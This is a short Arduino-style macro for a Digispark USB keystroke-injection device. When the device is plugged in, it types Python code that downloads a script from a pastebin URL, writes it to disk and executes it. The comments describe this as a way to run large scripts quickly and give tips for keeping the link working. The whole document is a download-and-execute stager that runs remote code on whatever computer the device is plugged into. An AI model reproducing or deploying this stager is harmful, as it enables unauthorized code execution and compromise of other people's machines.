# A script that downloads another python script from the internet and runs it,
# allows you to have extremely large scripts with faster typing times

# LINK CANNOT BE TOO LONG or the dspark will kill itself and show as an unrecognized device, but a pastebin link works perfect

#define PY_SCRIPT \
  DigiKeyboard.print("import urllib.request as r, os;"); \
  DigiKeyboard.print("f=open('pscript.py', 'wb');"); \
  DigiKeyboard.print("f.write(r.urlopen('https://pastebin.com/raw/FtY9kquy').read());"); \
  DigiKeyboard.print("f.close();"); \
  DigiKeyboard.print("os.system('python.exe pscript.py')");
